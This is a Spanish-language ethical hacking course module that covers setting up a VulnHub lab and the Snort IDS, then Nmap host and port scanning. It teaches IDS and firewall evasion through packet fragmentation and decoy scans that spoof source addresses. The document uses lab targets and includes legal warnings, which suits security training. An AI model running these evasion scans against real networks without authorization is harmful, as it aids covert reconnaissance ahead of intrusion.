| **Inicio**         | **Siguiente 2**                                           |
| ------------------ | --------------------------------------------------------- |
| [üè†](../README.md) | [‚è©](./5_2_Hacking_Etico_en_Entornos_Active_Directory.md) |

---

## **√çndice**

| Temario                                                                                                        |
| -------------------------------------------------------------------------------------------------------------- |
| [270. Preparaci√≥n del entorno: VulnHub](#270-preparaci√≥n-del-entorno-vulnhub)                                  |
| [271. Preparaci√≥n del entorno: Snort](#271-preparaci√≥n-del-entorno-snort)                                      |
| [272. Escaneo avanzado de Hosts](#272-escaneo-avanzado-de-hosts)                                               |
| [273. Escaneo avanzado de puertos](#273-escaneo-avanzado-de-puertos)                                           |
| [274. Fragmentaci√≥n de paquetes con Nmap](#274-fragmentaci√≥n-de-paquetes-con-nmap)                             |
| [275. Escaneo utilizando se√±uelos con Nmap](#275-escaneo-utilizando-se√±uelos-con-nmap)                         |
| [276. Spoofing de la identididad del atacante con Nmap](#276-spoofing-de-la-identididad-del-atacante-con-nmap) |
| [277. Control de la velocidad de escaneo con Nmap](#277-control-de-la-velocidad-de-escaneo-con-nmap)           |
| [278. Escaneos en IPv6 con Nmap](#278-escaneos-en-ipv6-con-nmap)                                               |
| [279. Escaneo avanzado de servicios y SO](#279-escaneo-avanzado-de-servicios-y-so)                             |
| [280. Alternativas a Nmap: Naabu y Netcat](#280-alternativas-a-nmap-naabu-y-netcat)                            |
| [281. Escaneo de puertos ultrarr√°pido: Masscan](#281-escaneo-de-puertos-ultrarr√°pido-masscan)                  |

| [282. Resoluci√≥n de la m√°quina Tr0ll1](#282-resoluci√≥n-de-la-m√°quina-tr0ll1) |

---

# **Recopilacion avanzada de informacion**

## **270. Preparaci√≥n del entorno: VulnHub**

### üß† ¬øQu√© es VulnHub?

**[VulnHub](https://www.vulnhub.com/)** es una plataforma gratuita donde puedes descargar **m√°quinas virtuales vulnerables** (archivos `.ova` o `.vmdk`) para practicar **hacking √©tico y pentesting** en un entorno **cerrado y legal**.

‚úÖ Son ideales para:

- Aprender sobre ciberseguridad.
- Prepararte para certificaciones (como OSCP).
- Practicar t√©cnicas reales sin romper la ley.

---

### üõ†Ô∏è ¬øQu√© necesitas para empezar?

#### ‚úÖ 1. VirtualBox (gratis)

Es un software de virtualizaci√≥n para correr m√°quinas virtuales.

üì• Descarga: [https://www.virtualbox.org/](https://www.virtualbox.org/)

> Alternativa: VMware Workstation (m√°s avanzado, pero requiere licencia si no es Player).

---

#### ‚úÖ 2. Kali Linux o Parrot OS

Necesitas un sistema con herramientas de hacking instaladas, como:

- `nmap`, `hydra`, `gobuster`, `metasploit`, etc.

üì• Puedes descargar Kali como:

- M√°quina virtual lista: [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines)
- O instalarlo t√∫ mismo.

---

#### ‚úÖ 3. M√°quina vulnerable desde VulnHub

Ve a: [https://www.vulnhub.com/](https://www.vulnhub.com/)

- Elige una m√°quina (por ejemplo: **Mr. Robot**, **Basic Pentesting: 1**, **DC: 1**, etc.).
- Descarga el archivo `.ova` o `.zip`.

---

### üîß C√≥mo preparar tu entorno paso a paso

#### üöÄ Paso 1: Instala VirtualBox

- Ejecuta el instalador, acepta las opciones por defecto.
- Abre VirtualBox y verifica que funciona.

---

#### üêß Paso 2: Importa Kali Linux

- Ve a **Archivo > Importar servicio virtualizado**.
- Selecciona el `.ova` de Kali y haz clic en **Importar**.

---

#### üí£ Paso 3: Importa la m√°quina vulnerable

- Haz lo mismo con la m√°quina descargada de VulnHub.
- Al finalizar, tendr√°s **dos m√°quinas**: Kali (ataque) y la m√°quina v√≠ctima.

---

#### üåê Paso 4: Configura la red (muy importante)

##### Usa **Red interna** o **Red NAT con adaptador puente**.

##### Opci√≥n A: Red Interna (segura y cerrada)

1. Apaga ambas m√°quinas.
2. En **Configuraci√≥n > Red**:

   - Elige **Adaptador 1 > Habilitado > Red Interna**.
   - Escribe un nombre como `vulnhub-net`.

‚úÖ Esto crea una red privada solo entre Kali y la v√≠ctima (sin Internet, pero segura).

##### Opci√≥n B: Adaptador puente (tu red LAN real)

- Ambos dispositivos estar√°n en la red de tu casa/oficina.
- Puedes hacer escaneos reales, pero ‚ö†Ô∏è aseg√∫rate de no afectar otros dispositivos.

---

#### üîç Paso 5: Encuentra la IP de la v√≠ctima

Arranca ambas m√°quinas.

En Kali, abre una terminal y ejecuta:

```bash
ip a  # te muestra tu IP local
```

Ahora escanea la red para encontrar la m√°quina v√≠ctima:

```bash
nmap -sn 192.168.1.0/24
```

(Sustituye `192.168.1.0/24` por tu rango de red).

---

### üêæ Ejemplo completo: Mr. Robot (de VulnHub)

#### üéØ Objetivo: Obtener acceso root en la m√°quina "Mr. Robot"

1. Descarga desde: [https://www.vulnhub.com/entry/mr-robot-1,151/](https://www.vulnhub.com/entry/mr-robot-1,151/)
2. Importa en VirtualBox.
3. Configura red interna con Kali.
4. Encuentra IP con `nmap`.
5. Escanea puertos:

```bash
nmap -sS -sV 192.168.56.101
```

6. Descubre servicios (ej: Apache, FTP).
7. Busca rutas ocultas con `gobuster`:

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
```

8. Explota vulnerabilidades, sube shell, consigue acceso.

---

### üõ°Ô∏è Consejos de seguridad

- **Nunca conectes una m√°quina vulnerable a tu red principal sin protecci√≥n**.
- **No uses m√°quinas VulnHub en la nube ni en redes empresariales.**
- Usa **instant√°neas** para volver al punto de partida f√°cilmente.

---

### üì¶ Herramientas comunes que debes conocer

| Herramienta  | Uso                            |
| ------------ | ------------------------------ |
| `nmap`       | Escaneo de red y puertos       |
| `gobuster`   | Enumeraci√≥n de rutas web       |
| `hydra`      | Ataques de fuerza bruta        |
| `netcat`     | Shells reversas                |
| `burpsuite`  | Manipulaci√≥n de peticiones web |
| `msfconsole` | Framework de explotaci√≥n       |

---

### ‚úÖ Resumen

| Paso | Acci√≥n                                   |
| ---- | ---------------------------------------- |
| 1.   | Instala VirtualBox                       |
| 2.   | Descarga Kali y una m√°quina vulnerable   |
| 3.   | Configura red interna o puente           |
| 4.   | Encuentra la IP de la v√≠ctima con `nmap` |
| 5.   | Comienza el pentesting                   |

---

[üîº](#√≠ndice)

---

## **271. Preparaci√≥n del entorno: Snort**

### üß† ¬øQu√© es Snort?

**Snort** es un sistema de **detecci√≥n de intrusos** (IDS ‚Äì _Intrusion Detection System_) de c√≥digo abierto.
Analiza el tr√°fico de red en tiempo real y detecta actividades maliciosas como:

- Escaneos de puertos
- Ataques de denegaci√≥n de servicio (DoS)
- Intentos de explotaci√≥n
- Malware en tr√°nsito

Snort puede:

- **Detectar** tr√°fico sospechoso (modo IDS)
- **Registrar** paquetes de red (modo sniffer)
- **Prevenir** ataques si se usa con un firewall (modo IPS)

---

### üõ†Ô∏è Requisitos para instalar Snort

Puedes usar Snort en:

- **Linux (Ubuntu, Kali, Debian, etc.)** ‚úÖ Recomendado
- **Windows** (no recomendado para producci√≥n)

---

### üì• Instalaci√≥n de Snort en Linux (Ubuntu / Kali)

#### üîß Paso 1: Instala dependencias

```bash
sudo apt update
sudo apt install -y build-essential libpcap-dev libpcre3-dev libdumbnet-dev bison flex zlib1g-dev liblzma-dev openssl libssl-dev
```

#### üîß Paso 2: Instala herramientas adicionales

```bash
sudo apt install -y libnghttp2-dev libpcap0.8-dev pkg-config libtool autoconf
```

#### üîß Paso 3: Crea carpetas de trabajo

```bash
mkdir ~/snort_src && cd ~/snort_src
```

#### üîß Paso 4: Descarga Snort

Ve a: [https://www.snort.org/downloads](https://www.snort.org/downloads)
Y copia el enlace del √∫ltimo tar.gz de Snort. Por ejemplo:

```bash
wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
tar -xvzf snort-2.9.20.tar.gz
cd snort-2.9.20
```

#### üîß Paso 5: Compila e instala

```bash
./configure --enable-sourcefire
make
sudo make install
```

#### üîß Paso 6: Verifica la instalaci√≥n

```bash
snort -V
```

Deber√≠as ver la versi√≥n de Snort instalada ‚úÖ

---

#### üìÅ Paso 7: Crear la estructura de directorios de configuraci√≥n

```bash
sudo mkdir -p /etc/snort/rules
sudo mkdir /var/log/snort
sudo mkdir /usr/local/lib/snort_dynamicrules
```

Copia archivos de ejemplo:

```bash
sudo cp etc/*.conf* /etc/snort
sudo cp etc/*.map /etc/snort
```

---

#### üîê Paso 8: Agrega una regla personalizada de ejemplo

Edita el archivo de reglas local:

```bash
sudo nano /etc/snort/rules/local.rules
```

Agrega esta regla simple:

```snort
alert icmp any any -> any any (msg:"Ping detectado"; sid:1000001; rev:1;)
```

Esto har√° que Snort alerte cada vez que detecte un **ping (ICMP)**.

---

#### ‚öôÔ∏è Paso 9: Edita el archivo de configuraci√≥n principal

```bash
sudo nano /etc/snort/snort.conf
```

Aseg√∫rate de que estas l√≠neas apunten bien:

```conf
var RULE_PATH /etc/snort/rules
include $RULE_PATH/local.rules
```

---

### üöÄ Ejemplo: Probar Snort en modo IDS

#### Abre una terminal para correr Snort:

```bash
sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

- `-A console`: salida por consola
- `-q`: modo silencioso (sin banners)
- `-c`: archivo de configuraci√≥n
- `-i`: interfaz de red (ajusta a tu red, puede ser `eth0`, `enp0s3`, `wlan0`, etc.)

---

#### En otra terminal, haz un ping para probar

```bash
ping 8.8.8.8
```

‚úÖ Si todo funciona, Snort deber√≠a mostrar una alerta como:

```
[**] [1:1000001:1] Ping detectado [**]
```

---

### ‚úÖ Resumen

| Paso | Acci√≥n                                    |
| ---- | ----------------------------------------- |
| 1.   | Instala dependencias                      |
| 2.   | Descarga y compila Snort                  |
| 3.   | Crea carpetas y configura reglas          |
| 4.   | Agrega reglas personalizadas              |
| 5.   | Ejecuta Snort y prueba con tr√°fico (ping) |

---

### üß™ ¬øQu√© m√°s puedes hacer con Snort?

- Analizar archivos `.pcap`
- Detectar escaneos con `nmap`
- Integrarlo con SIEM (como Splunk)
- Usarlo junto con `iptables` para prevenci√≥n (IPS)
- Crear reglas m√°s complejas para detectar patrones HTTP, DNS, FTP, etc.

---

### üì¶ Ejemplo completo (copiar y pegar en una m√°quina Kali)

```bash
sudo apt update && sudo apt install -y build-essential libpcap-dev libpcre3-dev libdumbnet-dev bison flex zlib1g-dev liblzma-dev openssl libssl-dev

mkdir ~/snort_src && cd ~/snort_src
wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
tar -xvzf snort-2.9.20.tar.gz && cd snort-2.9.20
./configure --enable-sourcefire
make && sudo make install
snort -V

sudo mkdir -p /etc/snort/rules /var/log/snort /usr/local/lib/snort_dynamicrules
sudo cp etc/*.conf* /etc/snort
sudo cp etc/*.map /etc/snort

echo 'alert icmp any any -> any any (msg:"Ping detectado"; sid:1000001; rev:1;)' | sudo tee /etc/snort/rules/local.rules

sudo sed -i 's|^# include \$RULE_PATH/local.rules|include \$RULE_PATH/local.rules|' /etc/snort/snort.conf

sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
```

> ‚ö†Ô∏è Reemplaza `eth0` por tu interfaz real (puedes verlas con `ip a`).

---

[üîº](#√≠ndice)

---

## **272. Escaneo avanzado de Hosts**

### üß† ¬øQu√© es el escaneo de hosts?

El **escaneo de hosts** es el proceso de descubrir **dispositivos activos** en una red y analizar qu√© **servicios, puertos o vulnerabilidades** est√°n expuestos.

üõ†Ô∏è El objetivo principal es:

- Ver qu√© computadoras est√°n conectadas a una red.
- Saber qu√© puertos tienen abiertos.
- Identificar sistemas operativos y servicios.
- Detectar posibles vulnerabilidades.

---

### üß∞ Herramienta principal: **Nmap**

**Nmap** (Network Mapper) es una de las herramientas m√°s potentes para escaneo de redes.

üì¶ Puedes hacer con Nmap:

- Descubrimiento de hosts
- Escaneo de puertos (TCP, UDP)
- Detecci√≥n de sistema operativo
- Detecci√≥n de servicios y versiones
- Escaneo con scripts NSE (Nmap Scripting Engine)

---

### üñ•Ô∏è Instalaci√≥n de Nmap

#### üîπ En Linux (Ubuntu, Kali, Debian, etc.)

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ En MacOS

Usa Homebrew:

```bash
brew install nmap
```

#### üîπ En Windows

1. Descarga desde: [https://nmap.org/download.html](https://nmap.org/download.html)
2. Elige el instalador "self-installer" para Windows.
3. Aseg√∫rate de que el instalador incluya Zenmap (opcional, interfaz gr√°fica).

---

### üõ†Ô∏è Escaneo b√°sico vs avanzado

| Tipo de escaneo           | Comando                   | Qu√© hace                              |
| ------------------------- | ------------------------- | ------------------------------------- |
| Ping scan (hosts activos) | `nmap -sn 192.168.1.0/24` | Detecta qu√© hosts est√°n vivos         |
| Escaneo de puertos        | `nmap -p- 192.168.1.1`    | Escanea todos los puertos             |
| Descubre servicios        | `nmap -sV 192.168.1.1`    | Detecta versiones de servicios        |
| Detecci√≥n de SO           | `nmap -O 192.168.1.1`     | Estima el sistema operativo           |
| Escaneo con scripts       | `nmap -sC 192.168.1.1`    | Usa scripts NSE por defecto           |
| Escaneo agresivo          | `nmap -A 192.168.1.1`     | Todo: OS, versiones, traceroute y m√°s |

---

### üî¨ Ejemplos f√°ciles de entender

#### üß™ 1. Escaneo para encontrar hosts activos

```bash
nmap -sn 192.168.1.0/24
```

üîç Esto env√≠a pings para ver qu√© IPs est√°n activas.

---

#### üß™ 2. Escaneo de puertos abiertos

```bash
nmap -p 22,80,443 192.168.1.5
```

üìå Verifica si los puertos 22 (SSH), 80 (HTTP), 443 (HTTPS) est√°n abiertos.

---

#### üß™ 3. Escaneo de todos los puertos

```bash
nmap -p- 192.168.1.5
```

üîç Escanea del puerto 1 al 65535.

---

#### üß™ 4. Escaneo con detecci√≥n de versi√≥n de servicios

```bash
nmap -sV 192.168.1.5
```

üëÅÔ∏è Muestra qu√© servicios est√°n corriendo y su versi√≥n (ej: Apache 2.4.41).

---

#### üß™ 5. Escaneo completo (avanzado)

```bash
nmap -A -T4 192.168.1.5
```

Incluye:

- Detecci√≥n de SO
- Script scanning
- Detecci√≥n de versiones
- Traceroute

---

#### üß™ 6. Escaneo silencioso (para evitar detecci√≥n)

```bash
nmap -sS -Pn 192.168.1.5
```

- `-sS`: escaneo SYN (semiabierto, m√°s dif√≠cil de detectar)
- `-Pn`: sin ping (act√∫a como si el host estuviera activo)

---

### üìò Ejemplo completo paso a paso

#### üéØ Escenario:

- Tu Kali Linux est√° en una red con IP `192.168.56.101`.
- Quieres analizar la m√°quina v√≠ctima con IP `192.168.56.102`.

---

#### üîç Paso 1: Ver qu√© hosts est√°n activos

```bash
nmap -sn 192.168.56.0/24
```

‚û°Ô∏è Resultado:

```txt
Nmap scan report for 192.168.56.102
Host is up (0.00024s latency).
```

---

#### üìñ Paso 2: Ver qu√© puertos est√°n abiertos

```bash
nmap -p- 192.168.56.102
```

‚û°Ô∏è Resultado:

```txt
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

---

#### üß† Paso 3: Detectar versiones de servicios

```bash
nmap -sV 192.168.56.102
```

‚û°Ô∏è Resultado:

```txt
22/tcp open  ssh    OpenSSH 7.9p1 Debian 10
80/tcp open  http   Apache httpd 2.4.38
3306/tcp open  mysql MySQL 5.7.29
```

---

#### ü§ñ Paso 4: Escaneo completo con scripts NSE

```bash
nmap -A -T4 192.168.56.102
```

Incluye:

- SO estimado
- Banner grabbing
- Script analysis (como detectar login por defecto)

---

### üõ°Ô∏è Recomendaciones de uso

- Siempre haz pruebas en redes controladas o en laboratorios (como VulnHub, Hack The Box).
- No escanees redes sin permiso (es ilegal en muchos pa√≠ses).
- Usa Wireshark o tcpdump para complementar la captura del tr√°fico.

---

### üìå Bonus: Zenmap (interfaz gr√°fica de Nmap)

Si est√°s en Windows o quieres algo visual, puedes usar **Zenmap**:

- Misma funcionalidad que Nmap, pero con botones y visualizaciones.
- Muestra gr√°ficos de puertos, hosts activos y puedes guardar perfiles.

Instalable desde: [https://nmap.org/zenmap/](https://nmap.org/zenmap/)

---

### ‚úÖ Resumen

| Acci√≥n                     | Comando                   |
| -------------------------- | ------------------------- |
| Buscar hosts activos       | `nmap -sn 192.168.1.0/24` |
| Escanear todos los puertos | `nmap -p- IP`             |
| Detecci√≥n de versiones     | `nmap -sV IP`             |
| Escaneo avanzado           | `nmap -A -T4 IP`          |
| Escaneo silencioso         | `nmap -sS -Pn IP`         |

---

[üîº](#√≠ndice)

---

## **273. Escaneo avanzado de puertos**

### üß† ¬øQu√© es el escaneo de puertos?

El **escaneo de puertos** es una t√©cnica para descubrir **qu√© servicios o aplicaciones est√°n corriendo** en un dispositivo de red (host) observando qu√© puertos est√°n **abiertos**, **cerrados** o **filtrados**.

üìå **Un puerto abierto = una puerta de entrada** que podr√≠a usarse para acceder a un sistema.

---

### üöÄ ¬øPara qu√© sirve el escaneo avanzado de puertos?

- Identificar servicios vulnerables.
- Ver qu√© software est√° corriendo (y su versi√≥n).
- Detectar configuraciones incorrectas.
- Preparar ataques en pentesting (o prevenirlos si eres sysadmin).

---

### üîß Herramienta principal: **Nmap**

La herramienta por excelencia para escaneo de puertos es **Nmap**.

#### ‚úÖ ¬øQu√© puede hacer Nmap a nivel avanzado?

- Escanear **todos** los puertos (1 al 65535)
- Detectar **versiones** de servicios
- Detectar **sistema operativo**
- Usar **scripts NSE** para enumerar servicios
- Hacer escaneos **evasivos** (evitar detecci√≥n por firewall)

---

### üõ†Ô∏è Instalaci√≥n de Nmap

#### üîπ En Kali, Ubuntu o Debian

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ En MacOS

```bash
brew install nmap
```

#### üîπ En Windows

Descargar desde [nmap.org/download.html](https://nmap.org/download.html)
Elige el instalador que incluye **Zenmap** (GUI opcional).

---

### üß™ Tipos de escaneo de puertos (explicado con ejemplos)

| Tipo de escaneo           | Comando       | Explicaci√≥n                             |
| ------------------------- | ------------- | --------------------------------------- |
| Escaneo r√°pido            | `nmap IP`     | Escanea los 1000 puertos m√°s comunes    |
| Todos los puertos         | `nmap -p- IP` | Escanea del puerto 1 al 65535           |
| Escaneo de puertos UDP    | `nmap -sU IP` | Escanea puertos UDP (m√°s lento)         |
| Escaneo de versi√≥n        | `nmap -sV IP` | Detecta versiones de servicios          |
| Escaneo "sigiloso"        | `nmap -sS IP` | Escaneo SYN (m√°s evasivo, semi-abierto) |
| Escaneo completo agresivo | `nmap -A IP`  | OS, servicios, traceroute, scripts NSE  |

---

### üß† ¬øQu√© es un puerto?

- Un **puerto** es una puerta de comunicaci√≥n dentro de un equipo.
- Se representan con n√∫meros entre 1 y 65535.
- Ejemplos:

  - 22 ‚Üí SSH
  - 80 ‚Üí HTTP
  - 443 ‚Üí HTTPS
  - 3306 ‚Üí MySQL

---

### üß∞ Comandos clave explicados

#### üîπ Escaneo de todos los puertos TCP (detallado)

```bash
nmap -p- 192.168.56.102
```

- `-p-`: escanea todos los puertos del 1 al 65535

---

#### üîπ Detecci√≥n de versi√≥n de servicios

```bash
nmap -sV -p 22,80,443 192.168.56.102
```

- `-sV`: identifica versiones de servicios
- `-p`: define puertos espec√≠ficos

---

#### üîπ Escaneo agresivo completo

```bash
nmap -A 192.168.56.102
```

- Incluye detecci√≥n de:

  - Sistema operativo
  - Versiones de servicios
  - Script NSE por defecto
  - Traceroute

---

#### üîπ Escaneo sigiloso (menos detectable)

```bash
nmap -sS -T2 -Pn 192.168.56.102
```

- `-sS`: escaneo SYN stealth
- `-T2`: velocidad lenta (m√°s evasivo)
- `-Pn`: no hace ping, asume que el host est√° vivo

---

### üî¨ Escaneo UDP (m√°s avanzado)

```bash
nmap -sU -p 53,161 192.168.56.102
```

- `-sU`: escaneo UDP
- Puerto 53 = DNS, 161 = SNMP

> ‚ö†Ô∏è UDP es m√°s lento y puede tener falsos positivos. Usar solo si sabes qu√© buscar.

---

### üìò Ejemplo completo paso a paso

#### üéØ Escenario:

Tu IP atacante: `192.168.56.101`
IP v√≠ctima: `192.168.56.102` (una m√°quina VulnHub o Hack The Box)

---

#### üß© Paso 1: Ver si el host est√° activo

```bash
nmap -sn 192.168.56.0/24
```

Resultado:

```txt
Nmap scan report for 192.168.56.102
Host is up (0.00044s latency).
```

---

#### üß© Paso 2: Escanear todos los puertos

```bash
nmap -p- 192.168.56.102
```

Resultado:

```txt
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

---

#### üß© Paso 3: Ver versiones de servicios

```bash
nmap -sV -p 22,80,3306 192.168.56.102
```

Resultado:

```txt
22/tcp   open  ssh    OpenSSH 7.4p1 Debian
80/tcp   open  http   Apache httpd 2.4.25
3306/tcp open  mysql  MySQL 5.7.19
```

---

#### üß© Paso 4: Escaneo avanzado con scripts

```bash
nmap -A 192.168.56.102
```

Incluye:

- OS detection
- Script NSE
- Traceroute

---

### üõ°Ô∏è Consejos pr√°cticos

- No escanees redes sin autorizaci√≥n (es ilegal).
- Combina Nmap con Wireshark o tcpdump si quieres ver el tr√°fico.
- Usa VulnHub, TryHackMe o Hack The Box para practicar legalmente.

---

[üîº](#√≠ndice)

---

## **274. Fragmentaci√≥n de paquetes con Nmap**

### üß† ¬øQu√© es la fragmentaci√≥n de paquetes?

La **fragmentaci√≥n de paquetes en Nmap** es una t√©cnica que divide los paquetes de red en **fragmentos m√°s peque√±os** durante el escaneo.

üîê ¬øPor qu√© hacer esto?

> Para **evadir firewalls, IDS (Sistemas de Detecci√≥n de Intrusos)** o reglas que analizan paquetes.

#### Analog√≠a f√°cil:

Imagina que el firewall es un portero que solo lee paquetes grandes para ver si algo sospechoso entra. Si partes el mensaje en trocitos muy peque√±os, puede que no los detecte porque los ve incompletos o inofensivos.

---

### üéØ ¬øCu√°ndo se usa la fragmentaci√≥n?

- En pruebas de **penetraci√≥n**.
- Cuando un firewall bloquea escaneos normales.
- Para confundir o evitar detecci√≥n por parte de EDR/IDS.

---

### üõ†Ô∏è ¬øC√≥mo se instala Nmap?

#### üîπ En Kali Linux / Ubuntu / Debian

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ En MacOS

```bash
brew install nmap
```

#### üîπ En Windows

1. Descarga desde: [https://nmap.org/download.html](https://nmap.org/download.html)
2. Inst√°lalo con el instalador (incluye Zenmap si deseas GUI).

---

### ‚öôÔ∏è ¬øC√≥mo se usa la fragmentaci√≥n en Nmap?

Se usa el par√°metro:

```bash
-f
```

Esto fragmenta los paquetes IP en fragmentos de **8 bytes**.

Tambi√©n puedes usar:

```bash
--mtu [valor]
```

Que fragmenta los paquetes en m√∫ltiplos personalizados de bytes (16, 32, 24, 8, etc).

---

### üîë Comandos con ejemplos

#### üîπ 1. Escaneo simple con fragmentaci√≥n

```bash
nmap -f 192.168.1.10
```

Esto fragmenta los paquetes IP por defecto en 8 bytes.

---

#### üîπ 2. Escaneo SYN (m√°s evasivo) + fragmentaci√≥n

```bash
nmap -sS -f 192.168.1.10
```

Usa el escaneo SYN (sigiloso) **combinado** con fragmentaci√≥n.

---

#### üîπ 3. Fragmentaci√≥n personalizada con MTU

```bash
nmap --mtu 24 192.168.1.10
```

Esto fuerza los paquetes a fragmentarse en m√∫ltiplos de 24 bytes.

---

#### üîπ 4. Escaneo m√°s completo con fragmentaci√≥n

```bash
nmap -sS -sV -f -Pn 192.168.1.10
```

Esto:

- `-sS`: Escaneo SYN
- `-sV`: Detecci√≥n de versi√≥n
- `-f`: Fragmenta paquetes
- `-Pn`: No hace ping (asume que el host est√° vivo)

---

### üö® Advertencia

- Algunos firewalls modernos ya detectan fragmentaci√≥n como comportamiento sospechoso.
- **No uses esta t√©cnica en redes que no son tuyas**. Escanear sin permiso es **ilegal** en muchos pa√≠ses.

---

### üìò Ejemplo completo paso a paso

#### üéØ Escenario

Est√°s en Kali Linux. Tienes una m√°quina virtual v√≠ctima con IP: `192.168.56.102`.

Quieres escanearla usando fragmentaci√≥n para evadir detecci√≥n de su firewall.

---

#### üß© Paso 1: Ver si el host est√° activo

```bash
nmap -sn 192.168.56.0/24
```

Resultado:

```txt
Nmap scan report for 192.168.56.102
Host is up.
```

---

#### üß© Paso 2: Escaneo SYN con fragmentaci√≥n

```bash
nmap -sS -f -Pn 192.168.56.102
```

Esto env√≠a paquetes fragmentados para evitar detecci√≥n.

Resultado:

```txt
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

---

#### üß© Paso 3: Escaneo de versiones con fragmentaci√≥n personalizada

```bash
nmap -sV --mtu 24 192.168.56.102
```

Resultado:

```txt
22/tcp open ssh OpenSSH 7.9
80/tcp open http Apache httpd 2.4.38
```

---

### üìå Resumen de opciones √∫tiles

| Opci√≥n     | Significado                             |
| ---------- | --------------------------------------- |
| `-f`       | Fragmentar paquetes IP (en 8 bytes)     |
| `--mtu 24` | Fragmentar usando m√∫ltiples de 24 bytes |
| `-sS`      | Escaneo SYN (stealth)                   |
| `-Pn`      | Omite el ping                           |
| `-sV`      | Detectar versi√≥n de servicios           |

---

### ‚úÖ Conclusi√≥n

- La fragmentaci√≥n de paquetes es una t√©cnica para **evadir detecci√≥n de seguridad**.
- Se usa en auditor√≠as o pentesting **avanzado**.
- Es f√°cil de aplicar con Nmap con la opci√≥n `-f` o `--mtu`.
- No debe usarse en redes ajenas sin permiso.

---

[üîº](#√≠ndice)

---

## **275. Escaneo utilizando se√±uelos con Nmap**

### üß† ¬øQu√© es un escaneo con se√±uelos en Nmap?

Es una t√©cnica para **ocultar la identidad real** del atacante durante un escaneo, **simulando que varias IPs est√°n escaneando al mismo tiempo**.

Esto se logra enviando paquetes **falsificados (spoofed)** con IPs se√±uelo (decoy) junto con los de tu IP real.

> üïµÔ∏è‚Äç‚ôÇÔ∏è **Objetivo:** confundir al firewall o IDS/IPS del objetivo para que **no sepa qui√©n fue el atacante real**.

---

### üìå ¬øPara qu√© sirve?

- Evasi√≥n de detecci√≥n en sistemas de defensa.
- Ocultar la IP real del atacante en los logs.
- Realizar pentesting de forma m√°s sigilosa.

---

### üîß ¬øC√≥mo se instala Nmap?

#### üîπ En Kali / Ubuntu / Debian

```bash
sudo apt update
sudo apt install nmap -y
```

#### üîπ En MacOS

```bash
brew install nmap
```

#### üîπ En Windows

1. Descargar desde: [https://nmap.org/download.html](https://nmap.org/download.html)
2. Instalar (opcional: incluir **Zenmap**, la interfaz gr√°fica).

---

### üß™ ¬øC√≥mo funciona el escaneo con se√±uelos?

Usamos la opci√≥n:

```bash
-D <decoy1>,<decoy2>,...,ME
```

- `-D`: Inicia el modo se√±uelo.
- `ME`: Representa **tu IP real**.
- Las otras IPs son **se√±uelos falsos** (spoofed IPs).
- Si no incluyes `ME`, Nmap no enviar√° paquetes reales desde tu IP.

---

### üß∞ Ejemplos b√°sicos

#### üîπ 1. Escaneo con 3 se√±uelos

```bash
nmap -sS -D 1.2.3.4,5.6.7.8,9.10.11.12,ME 192.168.56.102
```

- Nmap enviar√° paquetes como si vinieran de:

  - `1.2.3.4`
  - `5.6.7.8`
  - `9.10.11.12`
  - tu IP real

üß† Resultado: en los logs del servidor escaneado, **ver√°n tr√°fico de 4 IPs** y no sabr√°n cu√°l es la real.

---

#### üîπ 2. Escaneo m√°s evasivo + se√±uelos

```bash
nmap -sS -Pn -D RND:10 192.168.56.102
```

- `-sS`: escaneo SYN (stealth)
- `-Pn`: no hace ping (evita ser bloqueado)
- `-D RND:10`: genera 10 IPs aleatorias como se√±uelos

üõë ‚ö†Ô∏è Con `RND`, podr√≠as generar IPs que **no existen** o incluso internas. √ösalo con cuidado.

---

#### üîπ 3. Escaneo con versi√≥n de servicios + se√±uelos

```bash
nmap -sS -sV -D 203.0.113.1,198.51.100.5,ME 192.168.56.102
```

- `-sV`: detecta versiones de servicios
- `-D`: usa dos se√±uelos + tu IP

---

### üî¨ ¬øQu√© ocurre en los logs del servidor escaneado?

Si el servidor est√° protegido por un IDS como Snort, Suricata o un firewall con logging, ver√° algo as√≠:

```txt
Connection attempt from 1.2.3.4
Connection attempt from 5.6.7.8
Connection attempt from 192.168.1.20
Connection attempt from 9.10.11.12
```

üõ°Ô∏è Pero no sabr√° cu√°l fue **el verdadero atacante** (en este ejemplo: `192.168.1.20`).

---

### üìò Ejemplo completo paso a paso

#### üéØ Escenario

- Atacante (Kali): `192.168.56.101`
- V√≠ctima (m√°quina VulnHub): `192.168.56.102`
- Se√±uelos: `8.8.8.8`, `1.1.1.1`, `203.0.113.10`

---

#### üß© Paso 1: Confirmar que la v√≠ctima est√° activa

```bash
nmap -sn 192.168.56.0/24
```

> Verifica que `192.168.56.102` est√° **activo**.

---

#### üß© Paso 2: Ejecutar escaneo con se√±uelos

```bash
nmap -sS -p 22,80,3306 -D 8.8.8.8,1.1.1.1,203.0.113.10,ME 192.168.56.102
```

Esto escanear√° los puertos:

- 22 (SSH)
- 80 (HTTP)
- 3306 (MySQL)

üö® Los paquetes llegar√°n como si vinieran de **4 fuentes distintas**, incluyendo tu IP.

---

#### üß© Paso 3: Revisar resultados

```txt
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

‚úÖ Escaneo exitoso y m√°s sigiloso.

---

### üõ°Ô∏è Consejos √©ticos y legales

- No escanees redes ajenas sin permiso. Es **ilegal** en muchos pa√≠ses.
- Usa m√°quinas virtuales como **VulnHub**, **TryHackMe**, o **Hack The Box** para practicar.
- Esta t√©cnica se usa con fines de **auditor√≠a y seguridad defensiva**.

---

### ‚úÖ Resumen

| Opci√≥n  | Descripci√≥n                                   |
| ------- | --------------------------------------------- |
| `-D`    | Activa escaneo con se√±uelos                   |
| `ME`    | Indica tu IP real                             |
| `RND:n` | Genera n IPs aleatorias como se√±uelos         |
| `-sS`   | Escaneo SYN (sigiloso)                        |
| `-Pn`   | Evita el ping (asume que el host est√° activo) |

---

[üîº](#√≠ndice)

---

